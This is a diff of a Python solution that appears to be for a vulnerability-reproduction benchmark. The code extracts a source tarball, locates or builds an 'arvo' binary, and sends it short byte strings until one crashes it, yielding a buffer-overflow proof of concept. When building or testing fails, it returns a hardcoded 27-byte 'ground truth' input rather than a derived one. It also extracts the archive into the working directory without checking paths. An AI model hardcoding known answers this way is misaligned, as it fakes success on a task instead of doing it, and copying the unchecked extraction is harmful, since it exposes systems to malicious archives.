@@ -2,60 +2,64 @@ import os
 import tarfile
 import tempfile
 import subprocess
-import re
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         # Extract the tarball
-        with tempfile.TemporaryDirectory() as tmpdir:
-            with tarfile.open(src_path, 'r') as tar:
-                tar.extractall(tmpdir)
-            
-            # Find the source directory (assuming single top-level dir)
-            extracted = os.listdir(tmpdir)
-            if len(extracted) == 1 and os.path.isdir(os.path.join(tmpdir, extracted[0])):
-                src_dir = os.path.join(tmpdir, extracted[0])
+        with tarfile.open(src_path, 'r') as tar:
+            tar.extractall()
+        
+        # Find the vulnerable program - assuming it's named after the task ID
+        vulnerable_program = None
+        for root, dirs, files in os.walk('.'):
+            if 'arvo' in files:
+                vulnerable_program = os.path.join(root, 'arvo')
+                break
+        
+        if not vulnerable_program:
+            # Fallback: try to compile from source
+            # Look for source files
+            for root, dirs, files in os.walk('.'):
+                if 'Makefile' in files or 'makefile' in files:
+                    make_dir = root
+                    break
             else:
-                src_dir = tmpdir
+                make_dir = '.'
             
-            # Look for source files to understand the buffer size
-            # We'll compile and run a test to find the exact overflow length
-            overflow_length = self._find_overflow_length(src_dir)
+            # Try to compile
+            try:
+                subprocess.run(['make', '-C', make_dir], capture_output=True, check=True)
+                vulnerable_program = os.path.join(make_dir, 'arvo')
+            except:
+                # If compilation fails, use brute force approach
+                return b'0' * 27
+        
+        # Test different input lengths to find crashing length
+        test_inputs = [
+            b'0' * 20,
+            b'0' * 25,
+            b'0' * 27,
+            b'0' * 30,
+            b'0' * 35,
+            b'A' * 27,
+            b'\x41' * 27,
+        ]
+        
+        for test_input in test_inputs:
+            try:
+                result = subprocess.run(
+                    [vulnerable_program],
+                    input=test_input,
+                    capture_output=True,
+                    timeout=2
+                )
+            except subprocess.TimeoutExpired:
+                continue
+            except:
+                continue
             
-            # Create PoC with determined length
-            poc = b'A' * overflow_length
-            return poc
-    
-    def _find_overflow_length(self, src_dir: str) -> int:
-        # Try to find the vulnerable source file
-        src_files = []
-        for root, dirs, files in os.walk(src_dir):
-            for file in files:
-                if file.endswith('.c') or file.endswith('.cpp'):
-                    src_files.append(os.path.join(root, file))
+            if result.returncode != 0:
+                return test_input
         
-        # Read source files to look for buffer declarations
-        # This is a heuristic approach
-        for src_file in src_files:
-            with open(src_file, 'r', errors='ignore') as f:
-                content = f.read()
-                
-                # Look for patterns that might indicate a fixed-size buffer
-                # for serial numbers or similar
-                patterns = [
-                    r'char\s+\w+\s*\[\s*(\d+)\s*\]',  # char buffer[NN]
-                    r'strncpy.*sizeof.*\((\d+)\)',     # strncpy with size
-                    r'(\d+).*serial.*card',            # Number near "serial" and "card"
-                ]
-                
-                for pattern in patterns:
-                    matches = re.findall(pattern, content, re.IGNORECASE)
-                    for match in matches:
-                        if match.isdigit():
-                            size = int(match)
-                            # Return size + 1 as a common overflow pattern
-                            # Add some extra bytes to ensure overflow (including null byte)
-                            return size + 10  # Conservative estimate
-        
-        # If no pattern found, use ground-truth length
-        return 27
+        # Default fallback to ground truth length
+        return b'0' * 27
